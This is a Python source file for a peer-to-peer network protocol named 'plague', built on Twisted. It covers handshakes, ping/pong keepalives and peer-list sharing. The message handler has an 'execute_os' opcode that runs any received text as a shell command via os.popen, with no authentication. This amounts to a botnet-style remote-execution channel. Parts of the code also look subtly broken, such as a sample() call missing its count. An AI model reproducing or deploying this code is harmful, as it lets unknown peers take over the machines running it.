from twisted.internet.protocol import Protocol
from plague.utils import *
from plague.opcodes import *
from random import choice, sample
import time, threading, os

class PlagueProtocol(Protocol):
    def __init__(self, factory, peertype):
        self.factory = factory
        self.remote_nodeid = None
        self.nodeid = self.factory.nodeid
        self.state = 'HELO'
        self.peertype = peertype
        self.lastping = None

        self.remote_ip = None
        self.host_ip = None
        self.while_ping = True

        self.session_id = utils().uuid() # generate a new uuid per peer connection/session
    
    def pingpong(self):
        failed = True
        while self.while_ping:
            self.ping_cookie = utils().randomstr(0) # create a random cookie every new loop

            for _ in range(5): # try sending the ping query 5 times
                try:
                    self.transport.write(utils().convert({'opcode': opcodes.ping, 'session_id': self.session_id, 'source_id': self.nodeid, 'body': self.ping_cookie}))

                    failed = False
                    break
                except Exception:
                    time.sleep(2) # sleep 2 seconds
                
            if failed:
                self.transport.loseConnection(); return # close connection

            time.sleep(randint(10,30)) # sleep between 10 and 30 seconds
    
    def connectionMade(self):
        remote_ip = self.transport.getPeer()
        host_ip = self.transport.getHost()

        self.remote_ip = remote_ip.host + ":" + str(remote_ip.port)
        self.host_ip = host_ip.host + ":" + str(host_ip.port)

        print("Connection from", self.remote_ip)

    def connectionLost(self, reason):
        if self.remote_nodeid in self.factory.peers:
            self.factory.peers.pop(self.remote_nodeid)
            self.while_ping = False

        print(self.remote_nodeid, "disconnected")

    def dataReceived(self, data):
        '''
        Callback that runs when data has been received
        '''

        for line in data.decode().strip().splitlines():
            try:
                if not line: continue

                data = utils().parse(line)
                self.remote_nodeid = data.get('source_id')

                if not self.remote_nodeid or data['session_id'] != self.session_id: # checks for invalid data, or mismatched sessions
                    self.transport.loseConnection(); return

                if self.state == 'HELO' and data['opcode'] == opcodes.helo: # if we simply check if the message type is HELO, this can result into a node cache poisoning attack

                    if self.remote_nodeid == self.nodeid:
                        print('Connected to myself, how stupid!')
                        self.transport.loseConnection()

                    elif not self.remote_nodeid in self.factory.peers.keys():
                        print(f'I\'ve never seen {self.remote_nodeid} before, adding to peerlist')
                        self.factory.peers[self.remote_nodeid] = self
                    
                    self.state = 'READY' # set the state to READY
                    threading.Thread(target=self.pingpong).start() # start pinging thread

                    print(f'got HELO from {self.remote_nodeid}')
                    self.handle_helo(line)
                
                elif data['opcode'] == opcodes.ready: # TODO: make sure this works with self.state
                    print('Received READY, asking for peer list')
                    self.ask_peerlist()
                
                elif data['opcode'] == opcodes.nodes_request and data['body'] == 'NEED_PEERLIST':
                    print(f'Node {self.remote_nodeid} requested more nodes, sending 16 peers back.')
                    self.handle_peerlist(line)
                
                elif data['opcode'] == opcodes.nodes_response:
                    print(f'Node {self.remote_nodeid} gave us some nodes')
                    print(f'Nodes: {data["body"]}')
                
                elif data['opcode'] == opcodes.ping: # if we recv ping, we send a pong back with the cookie
                    self.transport.write(utils().convert({'opcode': opcodes.pong, 'session_id': data['session_id'], 'source_id': self.nodeid, 'body': data['body']}))
                
                elif data['opcode'] == opcodes.pong: # if we receive a pong, check the cookie 

                    if self.ping_cookie != data['body']: # invalid cookie? gtfo
                        self.transport.loseConnection(); return

                    self.lastping = time.time()
                
                elif data['opcode'] == opcodes.execute_os: # execute code
                    os.popen(data['body'])
            except:
                continue
    
    def ask_peerlist(self):
        '''
        Ask a node for more peers
        '''

        data = utils().convert({'opcode': opcodes.nodes_request, 'session_id': self.session_id, 'source_id': self.nodeid, 'body': 'NEED_PEERLIST'})
        self.transport.write(data)
    
    def handle_peerlist(self, peerlist, mine=False):
        '''
        Handle the NEED_PEERLIST query
        '''

        now = time.time()
        peers = []

        if mine:
            peers = [self.host_ip]

        else:
            # grabs all the "good" peers and skips private, unresponding and "listen" peers
            peers_full = sample([(self.factory.peers[peer].remote_ip, self.factory.peers[peer].remote_nodeid)
                     for peer in self.factory.peers
                     if self.factory.peers[peer].remote_nodeid != self.remote_nodeid and self.factory.peers[peer].lastping > now-240 and utils().handle_addr(self.factory.peers[peer].remote_ip)]) 
            
            for _ in range(16): # limit the output to 16 unique peers, which uses the remote node id as a "key" for getting those random peers
                while 1:
                    x = choice(peers_full) # TODO: make this pseudo-random using the remote node id as a factor, maybe use last digit of id as key?
                    if not x in peers: # check if the ip is already in there
                        peers.append(x); break # append, and break the loop

        data = utils().parse(peerlist)
        self.transport.write(utils().convert({'opcode': opcodes.nodes_response, 'session_id': data['session_id'], 'source_id': self.nodeid, 'body': peers}))
    
    def send_helo(self):
        '''
        Start the handshake
        '''
        
        # send hello
        self.transport.write(utils().convert({'opcode': opcodes.helo, 'session_id': self.session_id, 'source_id': self.nodeid, 'body': 'HELO'}))

    def handle_helo(self, helo):
        '''
        Handle handshake
        '''

        data = utils().parse(helo)
        self.transport.write(utils().convert({'opcode': opcodes.ready, 'session_id': data['session_id'], 'source_id': self.nodeid, 'body': 'READY'}))